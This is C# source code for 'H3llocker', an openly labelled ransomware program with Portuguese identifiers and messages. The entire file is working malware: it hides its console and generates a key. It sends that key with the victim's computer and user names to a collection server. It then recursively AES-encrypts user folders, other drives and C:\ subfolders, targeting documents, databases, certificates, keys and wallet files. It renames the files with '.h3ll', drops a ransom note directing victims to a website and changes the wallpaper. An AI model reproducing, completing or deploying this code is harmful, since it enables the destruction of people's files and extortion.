using System.Text;
using System.Collections.Specialized;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Net;

namespace H3ll
{
    class Program
    {

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        [DllImport("kernel32.dll")]
        public static extern bool AllocConsole();
        [DllImport("kernel32.dll")]
        public static extern bool FreeConsole();

        private static string username = Environment.UserName;
        private static string computerName = System.Environment.MachineName.ToString();
        private static string userFolder = "C:\\Users\\";
        private static string[] allDrives = System.IO.Directory.GetLogicalDrives();
        private static string serverUrl = "http://127.0.0.1:1337/chave";

        static void Main(string[] args)
        {
            FreeConsole();

            string password = GerarChave(32);
            string testFolder = "\\Desktop\\test";
            string combinedPath = userFolder + username + testFolder;
            EnviarChave(password);

            string userFolderPath = userFolder + username;
            string[] directories = Directory.GetDirectories(userFolderPath);

            for (int i = 0; i < directories.Length; i++)
            {
                string[] watchedFolders = { "Downloads", "Desktop", "Favorites", "Documents", "OneDrive", "Pictures", "Contacts" };

                if (watchedFolders.Any(directories[i].Contains))
                {
                    try
                    {
                        EncryptPasta(directories[i], password);
                    }
                    catch (Exception ex)
                    {
                        continue;
                    }
                }
            }

            Mensagem();

            string imageUrl = "https://raw.githubusercontent.com/kasp4rov/H3llocker/main/images/wall.png";
            string downloadPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "wallpaper.jpg");
            using (WebClient client = new WebClient())
            {
                client.DownloadFile(imageUrl, downloadPath);
            }
            SystemParametersInfo(0x0014, 0, downloadPath, 0x0001 | 0x0002);

            foreach (string drive in allDrives)
            {
                System.IO.DriveInfo di = new System.IO.DriveInfo(drive);
                if (di.IsReady)
                {
                    string[] directoriesDrive = Directory.GetDirectories(drive);
                    for (int i = 0; i < directoriesDrive.Length; i++)
                    {
                        string[] protectedDirs = { "C:" };
                        if (!protectedDirs.Any(directoriesDrive[i].Contains))
                        {
                            EncryptPasta(directoriesDrive[i], password);
                        }
                    }
                }
            }

            string rootPath = "C:\\";
            string[] directoriesroot = Directory.GetDirectories(rootPath);
            for (int b = 0; b < directoriesroot.Length; b++)
            {
                try
                {
                    EncryptPasta(directoriesroot[b], password);
                }
                catch (Exception ex)
                {
                    continue;
                }
            }

            password = null;
        }

        public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

        public static string GerarChave(int length)
        {
            const string pwList = "abcdefghijklmnopqrstuvwxyz*!=&?&/ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--)
            {
                res.Append(pwList[rnd.Next(pwList.Length)]);
            }
            return res.ToString();
        }

        public static void EnviarChave(string password)
        {
            using (HttpClient client = new HttpClient())
            {
                string queryString = $"?password={password}&computerName={computerName}&username={username}";
                string requestUrl = serverUrl + queryString;
                HttpResponseMessage response = client.GetAsync(requestUrl).Result;
                if (response.IsSuccessStatusCode)
                {
                    string responseBody = response.Content.ReadAsStringAsync().Result;
                    Console.WriteLine("Resposta do servidor: " + responseBody);
                }
                else
                {
                    Console.WriteLine("Erro ao enviar a requisição. Código de status: " + response.StatusCode);
                }
            }
        }


        public static void EncryptArq(string fileName, string password)
        {
            byte[] fileToEncryptBytes = File.ReadAllBytes(fileName);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
            byte[] encryptedBytes = AES_Encrypt(fileToEncryptBytes, passwordBytes);

            File.WriteAllBytes(fileName, encryptedBytes);
            System.IO.File.Move(fileName, fileName + ".h3ll");
        }

        public static void EncryptPasta(string location, string password)
        {
            var supportedExtensions = new[]
            {
                    ".mid", ".mp4", ".mp3", ".wma", ".flv", ".mkv", ".mov", ".avi", ".asf", ".mpeg", ".vob", ".mpg", ".wmv", ".fla", ".swf", ".wav", ".qcow2", ".vdi", ".vmdk", ".vmx", ".gpg", ".aes", ".ARC", ".PAQ", ".tar.bz2", ".tbk", ".bak", ".tar", ".tgz", ".rar", ".zip", ".djv", ".djvu", ".svg", ".bmp", ".png", ".gif", ".raw", ".cgm", ".jpeg", ".jpg", ".tif", ".tiff", ".NEF", ".psd", ".cmd", ".class", ".jar", ".java", ".asp", ".brd", ".sch", ".dch", ".dip", ".vbs", ".asm", ".pas", ".cpp", ".php", ".ldf", ".mdf", ".ibd", ".MYI", ".MYD", ".frm", ".odb", ".dbf", ".mdb", ".sql", ".SQLITEDB", ".SQLITE3", ".asc", ".lay6", ".lay", ".ms11 (Security copy)", ".sldm", ".sldx", ".ppsm", ".ppsx", ".ppam", ".docb", ".mml", ".sxm", ".otg", ".odg", ".uop", ".potx", ".potm", ".pptx", ".pptm", ".std", ".sxd", ".pot", ".pps", ".sti", ".sxi", ".otp", ".odp", ".wks", ".xltx", ".xltm", ".xlsx", ".xlsm", ".xlsb", ".slk", ".xlw", ".xlt", ".xlm", ".xlc", ".dif", ".stc", ".sxc", ".ots", ".ods", ".hwp", ".dotm", ".dotx", ".docm", ".docx", ".DOT", ".max", ".xml", ".txt", ".CSV", ".uot", ".RTF", ".pdf", ".XLS", ".PPT", ".stw", ".sxw", ".ott", ".odt", ".DOC", ".pem", ".csr", ".crt", ".key", "wallet.dat"
            };

            string[] files = Directory.GetFiles(location);
            string[] subfolders = Directory.GetDirectories(location);
            for (int i = 0; i < files.Length; i++)
            {
                string extension = Path.GetExtension(files[i]);
                if (supportedExtensions.Contains(extension))
                {
                    EncryptArq(files[i], password);
                }
            }
            for (int i = 0; i < subfolders.Length; i++)
            {
                EncryptPasta(subfolders[i], password);
            }
        }

        public static void Mensagem()
        {
            string testFolder = "\\Desktop\\LEIA-ME.txt";
            string combinedPath = userFolder + username + testFolder;
            string[] lines = { "AVISO !!!!", "Todos os seus arquivos são criptografados pelo H3llocker Ransomware", "Para descriptografar :", "- Acesse o Site : https://digitalh3ll.org ", "- Siga as instruções" };
            System.IO.File.WriteAllLines(combinedPath, lines);
        }

    }

}
